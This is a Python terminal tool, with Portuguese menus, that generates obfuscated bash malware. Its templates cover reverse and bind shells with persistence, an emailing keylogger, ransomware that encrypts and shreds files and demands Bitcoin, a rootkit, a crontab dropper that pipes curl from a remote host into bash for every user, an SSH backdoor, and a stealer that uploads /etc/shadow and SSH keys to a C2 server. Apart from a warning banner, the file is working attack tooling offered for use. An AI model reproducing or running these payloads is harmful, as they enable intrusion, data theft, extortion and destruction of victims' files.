#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
from typing import Dict, List, Optional

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax

# Realce de c√≥digo no terminal
import pygments
from pygments.lexers import BashLexer, PythonLexer
from pygments.formatters import TerminalFormatter

console = Console()

class GeradorBashMalware:
    def __init__(self):
        self.payloads = {
            'reverse_shell': {
                'function': self.gerar_reverse_shell,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Reverse Shell Bash persistente'
            },
            'bind_shell': {
                'function': self.gerar_bind_shell,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Bind Shell Bash com persist√™ncia'
            },
            'keylogger': {
                'function': self.gerar_keylogger,
                'category': 'Keyloggers',
                'danger_level': 'high',
                'description': 'Keylogger Bash com envio por email'
            },
            'ransomware': {
                'function': self.gerar_ransomware,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Ransomware Bash com criptografia AES'
            },
            'rootkit': {
                'function': self.gerar_rootkit,
                'category': 'Rootkits',
                'danger_level': 'critical',
                'description': 'Rootkit b√°sico com oculta√ß√£o de processos'
            },
            'crontab_infection': {
                'function': self.gerar_crontab_infection,
                'category': 'Persistence',
                'danger_level': 'high',
                'description': 'Infec√ß√£o via crontab para persist√™ncia'
            },
            'ssh_backdoor': {
                'function': self.gerar_ssh_backdoor,
                'category': 'Backdoors',
                'danger_level': 'high',
                'description': 'Backdoor SSH com autentica√ß√£o secreta'
            },
            'file_stealer': {
                'function': self.gerar_file_stealer,
                'category': 'Stealers',
                'danger_level': 'high',
                'description': 'Roubo de arquivos sens√≠veis via curl'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'base64': 'Codifica√ß√£o Base64',
            'gzip': 'Compress√£o GZIP',
            'string_reverse': 'Invers√£o de Strings',
            'variable_obfuscation': 'Ofusca√ß√£o de Vari√°veis',
            'comment_spam': 'Coment√°rios Aleat√≥rios'
        }
        
        self.banners = [
            self._gerar_banner_demon(),
            self._gerar_banner_skull(),
            self._gerar_banner_snake()
        ]
        
        self.c2_server = "https://your-c2-server.com/collect"
        
    def _gerar_banner_demon(self) -> str:
        return """
[bold red]
 ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ  ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ  ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ  ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ  ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ  
‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå 
‚ñê‚ñë‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ ‚ñê‚ñë‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñë‚ñå‚ñê‚ñë‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ ‚ñê‚ñë‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñë‚ñå‚ñê‚ñë‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñë‚ñå
‚ñê‚ñë‚ñå          ‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñå          ‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå
‚ñê‚ñë‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ ‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ ‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå
‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå
 ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå
          ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå          ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå‚ñê‚ñë‚ñå       ‚ñê‚ñë‚ñå
 ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñë‚ñå‚ñê‚ñë‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñë‚ñå ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñë‚ñå‚ñê‚ñë‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñë‚ñå‚ñê‚ñë‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñë‚ñå
‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå‚ñê‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñå 
 ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ  ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ  ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ  ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ  ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ  
[/bold red]
[bold white on red]        GERADOR DE MALWARE BASH - DEMON EDITION[/bold white on red]
"""
    
    def _gerar_banner_skull(self) -> str:
        return """
[bold white]
    .                                                      .
    .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
[/bold white]
[bold black on white]        BASH MALWARE GENERATOR - SKULL EDITION[/bold black on white]
"""
    
    def _gerar_banner_snake(self) -> str:
        return """
[bold green]
             _____
            /     \   ____
            |     |_/ __ \
            |     |\  ___/
            \_____/ \____>
            
      ____       _   _   _       ____
     / ___|     | | | | | |     |  _ \
    | |  _ _____| |_| |_| | _____| | | |
    | |_| |_____|  _  __  |_____| |_| |
     \____|     |_| |_| |_|     |____/
     
      ____    _    _   _  ____  _____  ____
     | __ )  / \  | \ | ||  _ \|_   _|/ ___|
     |  _ \ / _ \ |  \| || |_) | | |  \___ \
     | |_) / ___ \| |\  ||  __/  | |   ___) |
     |____/_/   \_\_| \_||_|     |_|  |____/
     
[/bold green]
[bold black on green]        BASH MALWARE GENERATOR - SNAKE EDITION[/bold black on green]
"""
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è USE APENAS PARA TESTES AUTORIZADOS! ‚ö†Ô∏è[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]üîß MENU PRINCIPAL[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Op√ß√£o", style="cyan", width=10)
            tabela.add_column("Categoria", style="green")
            tabela.add_column("Perigo", style="red")
            
            categorias = {
                'Shells': "Shells Avan√ßados",
                'Keyloggers': "Keyloggers",
                'Destrutivos': "Payloads Destrutivos",
                'Rootkits': "Rootkits",
                'Persistence': "Mecanismos de Persist√™ncia",
                'Backdoors': "Backdoors",
                'Stealers': "Stealers de Dados"
            }
            
            for i, (cod, nome) in enumerate(categorias.items(), 1):
                perigo = "‚ò†Ô∏è CR√çTICO" if cod == 'Destrutivos' else "‚ö†Ô∏è ALTO" if cod in ['Rootkits', 'Backdoors'] else "‚óé M√âDIO"
                tabela.add_row(str(i), nome, perigo)
            
            tabela.add_row("0", "Configura√ß√µes", "‚öôÔ∏è")
            tabela.add_row("9", "Sair", "üö™")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]‚û§[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, 10)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu('Shells')
            elif escolha == "2":
                self._mostrar_submenu('Keyloggers')
            elif escolha == "3":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "4":
                self._mostrar_submenu('Rootkits')
            elif escolha == "5":
                self._mostrar_submenu('Persistence')
            elif escolha == "6":
                self._mostrar_submenu('Backdoors')
            elif escolha == "7":
                self._mostrar_submenu('Stealers')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_submenu(self, categoria: str):
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            console.clear()
            titulo = f"[bold]{categoria.upper()}[/bold] - Selecione"
            
            if categoria == 'Destrutivos':
                titulo = f"[blink bold red]‚ò†Ô∏è {categoria.upper()} ‚ò†Ô∏è[/blink bold red]"
            
            tabela = Table(
                title=titulo,
                show_header=True,
                header_style="bold blue"
            )
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Nome", style="green")
            tabela.add_column("Descri√ß√£o")
            tabela.add_column("Perigo", style="red")
            
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                icone_perigo = {
                    'medium': '‚ö†Ô∏è',
                    'high': 'üî•',
                    'critical': 'üíÄ'
                }.get(dados['danger_level'], '')
                tabela.add_row(
                    str(i),
                    nome,
                    dados['description'],
                    f"{icone_perigo} {dados['danger_level'].upper()}"
                )
            
            tabela.add_row("0", "Voltar", "Retornar", "‚Ü©Ô∏è")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]‚û§[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(payloads_categoria)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
            self._processar_payload(nome_payload)
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]‚ö†Ô∏è PERIGO ELEVADO ‚ö†Ô∏è[/blink bold red]\n"
                "Este payload pode causar danos permanentes\n"
                "Use apenas em ambientes controlados!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar cria√ß√£o?", default=False):
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar t√©cnicas de ofusca√ß√£o?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=30)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_avancado(payload, tecnica)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload, 'bash')
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload in ['reverse_shell', 'bind_shell']:
            console.print(Panel.fit(
                "[bold]Configura√ß√£o[/bold]",
                border_style="blue"
            ))
            config['ip'] = Prompt.ask("[yellow]?[/yellow] IP", default="192.168.1.100")
            config['porta'] = IntPrompt.ask("[yellow]?[/yellow] Porta", default=4444)
            config['persistencia'] = Confirm.ask("[yellow]?[/yellow] Adicionar persist√™ncia?", default=True)
        
        elif nome_payload == 'ransomware':
            console.print(Panel.fit(
                "[bold red]Configura√ß√£o[/bold red]",
                border_style="red"
            ))
            config['extensoes'] = Prompt.ask(
                "[yellow]?[/yellow] Extens√µes (separadas por v√≠rgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados!"
            )
            config['wallet'] = Prompt.ask(
                "[yellow]?[/yellow] Carteira Bitcoin",
                default="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
            )
        
        elif nome_payload in ['ssh_backdoor', 'file_stealer']:
            config['c2_server'] = Prompt.ask(
                "[yellow]?[/yellow] Servidor C2",
                default=self.c2_server
            )
            config['intervalo'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo (minutos)",
                default=15
            )
        
        elif nome_payload == 'keylogger':
            config['email'] = Prompt.ask(
                "[yellow]?[/yellow] Email para envio",
                default="hacker@example.com"
            )
            config['intervalo'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo (minutos)",
                default=30
            )
        
        console.print("\n[bold]Resumo:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]T√©cnicas:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("T√©cnica", style="green")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione (separadas por v√≠rgula)",
            default="1,3"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str, language: str = 'bash'):
        console.print(Panel.fit(
            "[bold]PR√â-VISUALIZA√á√ÉO[/bold]",
            border_style="yellow"
        ))
        
        lexer = BashLexer() if language == 'bash' else PythonLexer()
        formatter = TerminalFormatter()
        
        lines = payload.split('\n')[:50]
        code = '\n'.join(lines)
        
        highlighted = pygments.highlight(code, lexer, formatter)
        console.print(highlighted)
        
        if len(payload.split('\n')) > 50:
            console.print("[yellow]... (truncado)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo",
            default=f"malware_{nome_payload}.sh"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write("#!/bin/bash\n")
                f.write(payload)
            
            os.chmod(nome_arquivo, 0o755)
            
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]‚úì Salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]\n"
                f"[yellow]Execute com: bash {nome_arquivo}[/yellow]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]‚úó Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _mostrar_menu_configuracao(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]‚öôÔ∏è CONFIGURA√á√ïES[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False)
            tabela.add_row("1", "Alterar servidor C2")
            tabela.add_row("2", "Testar ofusca√ß√£o")
            tabela.add_row("0", "Voltar")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]‚û§[/blink yellow] Selecione",
                choices=["0", "1", "2"],
                show_choices=False
            )
            
            if escolha == "1":
                self.c2_server = Prompt.ask(
                    "[yellow]?[/yellow] Novo servidor C2",
                    default=self.c2_server
                )
            elif escolha == "2":
                self._testar_ofuscacao()
            elif escolha == "0":
                return
    
    def _testar_ofuscacao(self):
        console.clear()
        codigo_teste = "echo 'Hello World'"
        
        console.print(Panel.fit(
            "[bold]TESTE DE OFUSCA√á√ÉO[/bold]",
            border_style="yellow"
        ))
        
        tabela = Table(title="T√©cnicas", show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("T√©cnica")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[yellow]?[/yellow] Selecione",
            choices=[str(i) for i in range(1, len(self.tecnicas_ofuscacao)+1)],
            show_choices=False
        )
        
        tecnica = list(self.tecnicas_ofuscacao.keys())[int(escolha)-1]
        codigo_ofuscado = self._ofuscar_avancado(codigo_teste, tecnica)
        
        console.print("\nResultado:")
        console.print(Syntax(codigo_ofuscado, "bash"))
        
        input("\nPressione Enter para continuar...")
    
    def _ofuscar_avancado(self, payload: str, tecnica: str) -> str:
        if tecnica == 'base64':
            encoded = base64.b64encode(payload.encode()).decode()
            return f"eval \"$(echo '{encoded}' | base64 -d)\""
        
        elif tecnica == 'gzip':
            compressed = zlib.compress(payload.encode())
            b64_encoded = base64.b64encode(compressed).decode()
            return f"eval \"$(echo '{b64_encoded}' | base64 -d | zcat)\""
        
        elif tecnica == 'string_reverse':
            reversed_payload = payload[::-1]
            return f"eval \"$(rev <<< '{reversed_payload}')\""
        
        elif tecnica == 'variable_obfuscation':
            parts = payload.split('\n')
            obfuscated = []
            var_names = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(5)]
            
            for part in parts:
                if part.strip() and not part.strip().startswith('#'):
                    var_name = random.choice(var_names)
                    obfuscated.append(f"{var_name}=\"{part}\"")
            
            obfuscated.append(f"eval \"${{{'; $'.join(var_names)}}}\"")
            return '\n'.join(obfuscated)
        
        elif tecnica == 'comment_spam':
            comments = [
                "# This is a normal system script",
                "# Generated by system update",
                "# DO NOT MODIFY - System Generated",
                "# Copyright System Utilities 2023",
                "# License GPL v3"
            ]
            lines = payload.split('\n')
            for i in range(0, len(lines), 2):
                lines.insert(i, random.choice(comments))
            return '\n'.join(lines)
        
        return payload

    # Implementa√ß√µes dos payloads em Bash
    def gerar_reverse_shell(self, ip: str, porta: int, persistencia: bool = True, **kwargs) -> str:
        payload = f"""#!/bin/bash
# Reverse Shell persistente para {ip}:{porta}

while true; do
    bash -i >& /dev/tcp/{ip}/{porta} 0>&1 2>/dev/null
    sleep 60
done &
"""
        if persistencia:
            payload += f"""
# Adicionando persist√™ncia via crontab
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{ip}/{porta} 0>&1 2>/dev/null'") | crontab -
"""
        return payload

    def gerar_bind_shell(self, ip: str, porta: int, persistencia: bool = True, **kwargs) -> str:
        payload = f"""#!/bin/bash
# Bind Shell na porta {porta}

while true; do
    nc -lvnp {porta} -e /bin/bash 2>/dev/null
    sleep 10
done &
"""
        if persistencia:
            payload += f"""
# Adicionando persist√™ncia via .bashrc
echo "nc -lvnp {porta} -e /bin/bash 2>/dev/null &" >> ~/.bashrc
"""
        return payload

    def gerar_keylogger(self, email: str, intervalo: int = 30, **kwargs) -> str:
        return f"""#!/bin/bash
# Keylogger Bash enviando para {email} a cada {intervalo} minutos

LOG_FILE="/tmp/.keylogger.log"
SMTP_SERVER="smtp.gmail.com:587"
SMTP_USER="{email.split('@')[0]}"
SMTP_PASS="sua_senha"  # Configure a senha correta

# Captura teclas
xinput list | grep -Po 'id=\\K\\d+(?=.*slave\\s*keyboard)' | \
xargs -P0 -n1 xinput test | \
while read line; do
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $line" >> "$LOG_FILE"
done &

# Envio peri√≥dico
while true; do
    sleep {intervalo}m
    if [ -f "$LOG_FILE" ]; then
        sendemail -f "$SMTP_USER@gmail.com" -t "{email}" \\
            -u "Keylogger Report" -m "$(cat "$LOG_FILE")" \\
            -s "$SMTP_SERVER" -xu "$SMTP_USER" -xp "$SMTP_PASS" -o tls=yes
        > "$LOG_FILE"
    fi
done &
"""

    def gerar_ransomware(self, extensoes: List[str], resgate: str, wallet: str, **kwargs) -> str:
        ext_str = '|'.join(extensoes)
        return f"""#!/bin/bash
# Ransomware Bash - CUIDADO!

# Criptografa arquivos com OpenSSL
encrypt_file() {{
    openssl enc -aes-256-cbc -salt -in "$1" -out "$1.encrypted" -pass pass:$(openssl rand -hex 32)
    shred -u "$1"
}}

# Varredura de arquivos
find /home /tmp /var/www -type f -regextype egrep -regex ".*\\.({ext_str})\$" | while read file; do
    encrypt_file "$file"
done

# Mensagem de resgate
cat <<EOF > /tmp/LEIA-ME.txt
{resgate}

Para descriptografar seus arquivos, envie 0.5 BTC para:
{wallet}

Entre em contato com email@provedor.com com o ID: $(openssl rand -hex 8)
EOF

# Persist√™ncia
echo "bash $0" >> ~/.bashrc
"""

    def gerar_rootkit(self, **kwargs) -> str:
        return """#!/bin/bash
# Rootkit Bash b√°sico

# Esconde processos
hide_process() {
    while true; do
        PID=$$
        mkdir -p /tmp/.hidden
        echo $PID > /tmp/.hidden/$PID
        sleep 60
    done
}

# Backdoor
backdoor() {
    while true; do
        bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 2>/dev/null
        sleep 300
    done
}

# Inicia componentes
hide_process &
backdoor &

# Persist√™ncia
echo "bash $0 &" >> /etc/rc.local
chmod +x /etc/rc.local
"""

    def gerar_crontab_infection(self, **kwargs) -> str:
        return """#!/bin/bash
# Infec√ß√£o via crontab

# Download e execu√ß√£o do payload
PAYLOAD_URL="http://malicious-server.com/payload.sh"
(crontab -l 2>/dev/null; echo "* * * * * curl -s $PAYLOAD_URL | bash") | crontab -

# Propaga√ß√£o para outros usu√°rios
for user in $(cut -f1 -d: /etc/passwd); do
    (crontab -u $user -l 2>/dev/null; echo "* * * * * curl -s $PAYLOAD_URL | bash") | crontab -u $user -
done
"""

    def gerar_ssh_backdoor(self, c2_server: str, intervalo: int, **kwargs) -> str:
        return f"""#!/bin/bash
# Backdoor SSH com autentica√ß√£o secreta

SECRET_PASS="s3cr3t_p4ssw0rd_$(hostname)"
echo "backdoor:$SECRET_PASS" | chpasswd

# Configura√ß√£o do SSH
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
systemctl restart ssh

# Exfiltra√ß√£o peri√≥dica de credenciais
while true; do
    sleep {intervalo}m
    curl -X POST -d "host=$(hostname)&pass=$SECRET_PASS" {c2_server}
done &
"""

    def gerar_file_stealer(self, c2_server: str, intervalo: int, **kwargs) -> str:
        return f"""#!/bin/bash
# File Stealer enviando para {c2_server}

STEAL_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "~/.ssh/id_rsa"
    "~/.bash_history"
)

upload_file() {{
    curl -F "file=@$1" -F "host=$(hostname)" {c2_server}
}}

while true; do
    for file in "${{STEAL_FILES[@]}}"; do
        if [ -f "$file" ]; then
            upload_file "$file"
        fi
    done
    sleep {intervalo}m
done &
"""

    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]‚ö†Ô∏è ATEN√á√ÉO: USO ILEGAL √â CRIME! ‚ö†Ô∏è[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        gerador = GeradorBashMalware()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]‚úó Cancelado[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]‚úó Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
